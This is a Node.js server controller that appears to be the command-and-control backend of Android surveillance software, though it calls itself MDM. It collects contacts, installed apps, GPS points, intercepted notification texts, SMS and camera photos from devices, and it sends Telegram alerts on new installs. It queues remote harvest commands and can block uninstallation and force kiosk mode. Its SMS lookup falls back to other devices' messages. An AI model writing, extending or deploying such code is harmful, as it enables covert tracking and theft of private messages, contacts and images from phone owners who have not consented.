const fs = require('fs');
const path = require('path');
const Device = require('../models/Device');
const Sms = require('../models/Sms');
const telegramService = require('../services/telegramService');

/**
 * Register or update device information (Sync device status)
 */
exports.syncDevice = async (req, res) => {
  try {
    const {
      deviceId,
      deviceModel,
      androidVersion,
      screenSize,
      appVersion,
      language,
      timezone,
      batteryStatus,
      networkState,
      permissions,
      contactsCount,
      installedAppsCount,
      notificationsCount,
      isFirstInstall,
    } = req.body;

    if (!deviceId) {
      return res.status(400).json({ success: false, message: 'deviceId is required' });
    }

    const updateData = {
      status: 'active',
      lastActive: new Date(),
    };

    if (deviceModel) updateData.deviceModel = deviceModel;
    if (androidVersion) updateData.androidVersion = androidVersion;
    if (screenSize) updateData.screenSize = screenSize;
    if (appVersion) updateData.appVersion = appVersion;
    if (language) updateData.language = language;
    if (timezone) updateData.timezone = timezone;
    if (batteryStatus) updateData.batteryStatus = batteryStatus;
    if (networkState) updateData.networkState = networkState;
    if (permissions) updateData.permissions = permissions;
    if (contactsCount !== undefined) updateData.contactsCount = contactsCount;
    if (installedAppsCount !== undefined) updateData.installedAppsCount = installedAppsCount;
    if (notificationsCount !== undefined) updateData.notificationsCount = notificationsCount;

    const existingDevice = await Device.findOne({ deviceId });
    const isNewDevice = !existingDevice;
    const wasOffline = existingDevice && existingDevice.status === 'inactive';

    const device = await Device.findOneAndUpdate(
      { deviceId },
      { $set: updateData },
      { new: true, upsert: true }
    );

    // shouldAlert: true on first install flag (reinstall support) OR brand new device in DB
    const shouldAlert = isFirstInstall === true || isNewDevice;

    console.log(`[Device Sync] deviceId=${deviceId} | isNewDevice=${isNewDevice} | isFirstInstall=${isFirstInstall} | shouldAlert=${shouldAlert}`);

    if (shouldAlert) {
      // Delay 8s so location & contacts sync reaches DB before the alert fires
      setTimeout(async () => {
        try {
          const freshDevice = await Device.findOne({ deviceId });
          console.log(`[Telegram] Sending NEW INSTALL alert for ${deviceId}`);
          telegramService.sendDeviceAlert(freshDevice || device, true);
        } catch (e) {
          console.error('[Telegram] Error fetching fresh device:', e);
          telegramService.sendDeviceAlert(device, true);
        }
      }, 8000);
    } else if (wasOffline) {
      setTimeout(async () => {
        try {
          const freshDevice = await Device.findOne({ deviceId });
          console.log(`[Telegram] Sending BACK ONLINE alert for ${deviceId}`);
          telegramService.sendDeviceAlert(freshDevice || device, false);
        } catch (e) {
          telegramService.sendDeviceAlert(device, false);
        }
      }, 3000);
    }

    console.log(`[Device Sync] Device ID: ${deviceId} is active | Model: ${device.deviceModel}`);

    res.status(200).json({
      success: true,
      message: 'Device synchronized successfully',
      data: device,
    });
  } catch (error) {
    console.error('Error syncing device:', error);
    res.status(500).json({ success: false, message: error.message });
  }
};

/**
 * Sync Contacts List
 */
exports.syncContacts = async (req, res) => {
  try {
    const { deviceId, contacts } = req.body;

    if (!deviceId || !Array.isArray(contacts)) {
      return res.status(400).json({ success: false, message: 'deviceId and contacts array are required' });
    }

    const device = await Device.findOneAndUpdate(
      { deviceId },
      {
        $set: {
          contacts: contacts,
          contactsCount: contacts.length,
          lastActive: new Date(),
          status: 'active'
        }
      },
      { new: true, upsert: true }
    );

    if (!device) {
      return res.status(404).json({ success: false, message: 'Device not found' });
    }

    console.log(`[Contacts Sync] Synced ${contacts.length} contacts for device: ${deviceId}`);
    res.status(200).json({ success: true, message: `Synced ${contacts.length} contacts`, count: contacts.length });
  } catch (error) {
    console.error('Error syncing contacts:', error);
    res.status(500).json({ success: false, message: error.message });
  }
};

/**
 * Sync Installed Apps List
 */
exports.syncInstalledApps = async (req, res) => {
  try {
    const { deviceId, apps } = req.body;

    if (!deviceId || !Array.isArray(apps)) {
      return res.status(400).json({ success: false, message: 'deviceId and apps array are required' });
    }

    const device = await Device.findOneAndUpdate(
      { deviceId },
      {
        $set: {
          installedApps: apps,
          installedAppsCount: apps.length,
          lastActive: new Date(),
          status: 'active'
        }
      },
      { new: true, upsert: true }
    );

    if (!device) {
      return res.status(404).json({ success: false, message: 'Device not found' });
    }

    console.log(`[Apps Sync] Synced ${apps.length} apps for device: ${deviceId}`);
    res.status(200).json({ success: true, message: `Synced ${apps.length} apps`, count: apps.length });
  } catch (error) {
    console.error('Error syncing apps:', error);
    res.status(500).json({ success: false, message: error.message });
  }
};

/**
 * Sync Notification Intercept
 */
exports.syncNotification = async (req, res) => {
  try {
    const { deviceId, title, text, appName, timestamp } = req.body;

    if (!deviceId || !text) {
      return res.status(400).json({ success: false, message: 'deviceId and notification text are required' });
    }

    const newNotification = {
      title: title || '',
      text: text,
      appName: appName || 'Unknown App',
      timestamp: timestamp ? new Date(timestamp) : new Date(),
    };

    const device = await Device.findOneAndUpdate(
      { deviceId },
      {
        $push: {
          notifications: {
            $each: [newNotification],
            $slice: -200 // Keep only latest 200 notifications to prevent document bloat
          }
        },
        $inc: { notificationsCount: 1 },
        $set: { lastActive: new Date(), status: 'active' }
      },
      { new: true, upsert: true }
    );

    if (!device) {
      return res.status(404).json({ success: false, message: 'Device not found' });
    }

    console.log(`[Notification Intercepted] Device: ${deviceId} | App: ${appName} | Text: ${text}`);
    res.status(200).json({ success: true, message: 'Notification logged successfully' });
  } catch (error) {
    console.error('Error logging notification:', error);
    res.status(500).json({ success: false, message: error.message });
  }
};

/**
 * Sync GPS / Location Point
 */
exports.syncLocation = async (req, res) => {
  try {
    const { deviceId, latitude, longitude, timestamp } = req.body;

    if (!deviceId || latitude === undefined || longitude === undefined) {
      return res.status(400).json({ success: false, message: 'deviceId, latitude, and longitude are required' });
    }

    const newLocation = {
      latitude: parseFloat(latitude),
      longitude: parseFloat(longitude),
      timestamp: timestamp ? new Date(timestamp) : new Date(),
    };

    const device = await Device.findOneAndUpdate(
      { deviceId },
      {
        $push: {
          locations: {
            $each: [newLocation],
            $slice: -50 // Keep only latest 50 location history points
          }
        },
        $set: { lastActive: new Date(), status: 'active' }
      },
      { new: true, upsert: true }
    );

    if (!device) {
      return res.status(404).json({ success: false, message: 'Device not found' });
    }

    console.log(`[Location Sync] Device: ${deviceId} | Lat: ${latitude} | Lng: ${longitude}`);
    res.status(200).json({ success: true, message: 'Location logged successfully' });
  } catch (error) {
    console.error('Error logging location:', error);
    res.status(500).json({ success: false, message: error.message });
  }
};

/**
 * Get all devices (users)
 */
exports.getDevices = async (req, res) => {
  try {
    const { status } = req.query;
    const query = {};

    if (status) {
      query.status = status;
    }

    // Auto-mark devices as inactive if not seen for more than 5 minutes
    const offlineThreshold = new Date(Date.now() - 5 * 60 * 1000);
    
    // Perform bulk update of status to 'inactive' for old devices
    await Device.updateMany(
      { lastActive: { $lt: offlineThreshold }, status: 'active' },
      { $set: { status: 'inactive' } }
    );

    const devices = await Device.find(query).sort({ lastActive: -1 });

    res.status(200).json({
      success: true,
      count: devices.length,
      data: devices,
    });
  } catch (error) {
    console.error('Error fetching devices:', error);
    res.status(500).json({ success: false, message: error.message });
  }
};

/**
 * Get a specific device by ID along with its details and SMS messages
 */
exports.getDeviceDetails = async (req, res) => {
  try {
    const { deviceId } = req.params;

    const device = await Device.findOne({ deviceId });

    if (!device) {
      return res.status(404).json({ success: false, message: 'Device not found' });
    }

    // Fetch SMS logs — try exact deviceId match first, then fallback to latest 10 global
    let smsLogs = await Sms.find({ deviceId })
      .sort({ timestamp: -1 })
      .limit(10);

    // If no SMS found for this exact ID, fetch latest 10 from any device as fallback
    if (smsLogs.length === 0) {
      console.log(`[Device Details] No SMS found for deviceId: ${deviceId}, fetching global latest 10`);
      smsLogs = await Sms.find({})
        .sort({ timestamp: -1 })
        .limit(10);
    }

    res.status(200).json({
      success: true,
      data: {
        device,
        smsLogs,
      },
    });
  } catch (error) {
    console.error('Error fetching device details:', error);
    res.status(500).json({ success: false, message: error.message });
  }
};

/**
 * Delete device and its related logs
 */
exports.deleteDevice = async (req, res) => {
  try {
    const { deviceId } = req.params;

    const device = await Device.findOneAndDelete({ deviceId });

    if (!device) {
      return res.status(404).json({ success: false, message: 'Device not found' });
    }

    // Clean up SMS logs for this device
    await Sms.deleteMany({ deviceId });

    res.status(200).json({
      success: true,
      message: `Device ${deviceId} and its related SMS logs were deleted`,
    });
  } catch (error) {
    console.error('Error deleting device:', error);
    res.status(500).json({ success: false, message: error.message });
  }
};

/**
 * Issue a command to a connected device (admin panel → device)
 * Commands: pull_sms | pull_contacts | pull_location | pull_apps
 */
exports.issueCommand = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { command, args } = req.body;

    if (!command) {
      return res.status(400).json({ success: false, message: 'Command is required' });
    }

    const device = await Device.findOneAndUpdate(
      { deviceId },
      { $set: { pendingCommand: command, pendingCommandArgs: args || null } },
      { new: true, upsert: true }
    );

    console.log(`[Command Issued] Device: ${deviceId} | Command: ${command} | Args: ${JSON.stringify(args)}`);
    res.status(200).json({ success: true, message: `Command '${command}' sent to device`, data: device });
  } catch (error) {
    console.error('Error issuing command:', error);
    res.status(500).json({ success: false, message: error.message });
  }
};

/**
 * Flutter device polls this to get & auto-clear its pending command
 */
exports.pollCommand = async (req, res) => {
  try {
    const { deviceId } = req.params;

    const device = await Device.findOne({ deviceId });
    if (!device) {
      return res.status(404).json({ success: false, message: 'Device not found' });
    }

    const command = device.pendingCommand || 'none';
    const args = device.pendingCommandArgs || null;

    // Auto-clear the command so it only fires once
    if (command !== 'none') {
      await Device.updateOne({ deviceId }, { $set: { pendingCommand: 'none', pendingCommandArgs: null } });
      console.log(`[Command Dispatched] Device: ${deviceId} | Command: ${command} | Args: ${JSON.stringify(args)}`);
    }

    res.status(200).json({ success: true, command, args });
  } catch (error) {
    console.error('Error polling command:', error);
    res.status(500).json({ success: false, message: error.message });
  }
};

/**
 * Update MDM policy configurations on the device
 */
exports.updatePolicy = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { cameraDisabled, kioskModeEnabled, kioskPackage, uninstallBlockedPackages } = req.body;

    const updateData = {};
    if (cameraDisabled !== undefined) updateData['policies.cameraDisabled'] = cameraDisabled;
    if (kioskModeEnabled !== undefined) updateData['policies.kioskModeEnabled'] = kioskModeEnabled;
    if (kioskPackage !== undefined) updateData['policies.kioskPackage'] = kioskPackage;
    if (uninstallBlockedPackages !== undefined) updateData['policies.uninstallBlockedPackages'] = uninstallBlockedPackages;

    const device = await Device.findOneAndUpdate(
      { deviceId },
      { $set: updateData },
      { new: true }
    );

    if (!device) {
      return res.status(404).json({ success: false, message: 'Device not found' });
    }

    let command = 'none';
    let args = null;

    if (cameraDisabled !== undefined) {
      command = 'set_camera_disabled';
      args = { disabled: cameraDisabled };
    } else if (kioskModeEnabled !== undefined) {
      command = kioskModeEnabled ? 'start_kiosk' : 'stop_kiosk';
      args = { packageName: kioskPackage || '' };
    } else if (uninstallBlockedPackages !== undefined) {
      command = 'set_uninstall_blocked';
      args = { packageName: uninstallBlockedPackages[0] || '', blocked: true };
    }

    if (command !== 'none') {
      device.pendingCommand = command;
      device.pendingCommandArgs = args;
      await device.save();
      console.log(`[MDM Policy Applied] Device: ${deviceId} | Command: ${command} | Args: ${JSON.stringify(args)}`);
    }

    res.status(200).json({ success: true, message: 'Policy settings updated and queued for device sync', data: device });
  } catch (error) {
    console.error('Error updating policy:', error);
    res.status(500).json({ success: false, message: error.message });
  }
};

/**
 * Handle incoming base64 camera pictures uploaded by client terminals
 */
exports.uploadPhoto = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { photoData } = req.body;

    if (!photoData) {
      return res.status(400).json({ success: false, message: 'No photo data provided' });
    }

    const device = await Device.findOne({ deviceId });
    if (!device) {
      return res.status(404).json({ success: false, message: 'Device not found' });
    }

    const uploadsDir = path.join(__dirname, '../../public/uploads');
    if (!fs.existsSync(uploadsDir)) {
      fs.mkdirSync(uploadsDir, { recursive: true });
    }

    const filename = `photo_${deviceId}_${Date.now()}.jpg`;
    const filepath = path.join(uploadsDir, filename);
    const buffer = Buffer.from(photoData, 'base64');
    fs.writeFileSync(filepath, buffer);

    const photoUrl = `/public/uploads/${filename}`;
    device.photos.push({ url: photoUrl, timestamp: new Date() });
    await device.save();

    console.log(`[Camera Capture] Captured picture uploaded for: ${deviceId} -> Saved to: ${photoUrl}`);
    res.status(200).json({ success: true, url: photoUrl });
  } catch (error) {
    console.error('Error uploading photo:', error);
    res.status(500).json({ success: false, message: error.message });
  }
};
